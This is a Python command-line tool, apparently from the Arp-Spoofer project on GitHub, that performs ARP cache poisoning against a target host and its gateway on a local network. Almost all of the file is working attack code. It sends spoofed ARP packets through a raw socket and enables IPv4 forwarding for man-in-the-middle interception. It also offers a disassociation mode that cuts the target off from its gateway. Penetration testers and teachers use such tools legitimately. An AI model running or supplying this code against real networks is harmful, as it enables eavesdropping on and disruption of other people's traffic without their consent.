#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

import argparse
import os
import time
from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW

from packets import ARPSetupProxy


class Spoofer(object):
    def __init__(self, *, interface: str, attackermac: str,
                 gatewaymac: str, gatewayip: str, targetmac: str, targetip: str,
                 interval: float, disassociate: bool, ipforward: bool):
        self.__interval = interval
        self.__ipv4_forwarding = ipforward
        self.__arp = ARPSetupProxy(interface, attackermac, gatewaymac,
                                   gatewayip, targetmac, targetip,
                                   disassociate)

    def execute(self):
        try:
            self.__check_ipv4_forwarding()
            self.__display_setup_prompt()
            self.__send_attack_packets()
        except KeyboardInterrupt:
            raise SystemExit('[!] ARP Spoofing attack aborted.')

    def __check_ipv4_forwarding(self, config='/proc/sys/net/ipv4/ip_forward'):
        if self.__ipv4_forwarding is True:
            with open(config, mode='r+', encoding='utf_8') as config_file:
                line = next(config_file)
                config_file.seek(0)
                config_file.write(line.replace('0', '1'))

    def __display_setup_prompt(self):
        print('\n[>>>] ARP Spoofing configuration:')
        configurations = {'IPv4 Forwarding': str(self.__ipv4_forwarding),
                          'Interface': self.__arp.interface,
                          'Attacker MAC': self.__arp.packets.attacker_mac,
                          'Gateway IP': self.__arp.packets.gateway_ip,
                          'Gateway MAC': self.__arp.packets.gateway_mac,
                          'Target IP': self.__arp.packets.target_ip,
                          'Target MAC': self.__arp.packets.target_mac}

        for setting, value in configurations.items():
            print('{0: >7} {1: <16}{2:.>25}'.format('[+]', setting, value))

        while True:
            proceed = input('\n[!] ARP packets ready. Execute the attack with '
                            'these settings? (Y/N) ').lower()
            if proceed == 'y':
                print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to '
                      'abort.')
                break
            if proceed == 'n':
                raise KeyboardInterrupt

    def __send_attack_packets(self):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.__arp.interface, htons(0x0800)))
            while True:
                for packet in self.__arp.packets:
                    sock.send(packet)
                time.sleep(self.__interval)


if __name__ == '__main__':
    if os.getuid() != 0:
        raise SystemExit('Error: Permission denied. Execute this application '
                         'with administrator privileges.')

    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    options = parser.add_mutually_exclusive_group()
    parser.add_argument('targetip', type=str, metavar='TARGET_IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('-i', '--interface', type=str,
                        help='Interface on the attacker machine to send '
                             'packets from.')
    parser.add_argument('--attackermac', type=str, metavar='MAC',
                        help='MAC address of the NIC from which the attacker '
                             'machine will send the spoofed ARP packets.')
    parser.add_argument('--gatewaymac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gatewayip', type=str, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--interval', type=float, default=1, metavar='TIME',
                        help='Time in between each transmission of spoofed ARP '
                             'packets (defaults to 1 second).')
    options.add_argument('-d', '--disassociate', action='store_true',
                         help='Execute a disassociation attack in which a '
                              'randomized MAC address is set for the attacker '
                              'machine, effectively making the target host '
                              'send packets to a non-existent gateway.')
    options.add_argument('-f', '--ipforward', action='store_true',
                         help='Temporarily enable forwarding of IPv4 packets '
                              'on the attacker system until the next reboot. '
                              'Set this to intercept information between the '
                              'target host and the gateway, performing a '
                              'man-in-the-middle attack. Requires '
                              'administrator privileges.')
    cli_args = parser.parse_args()
    spoofer = Spoofer(**vars(cli_args))
    spoofer.execute()
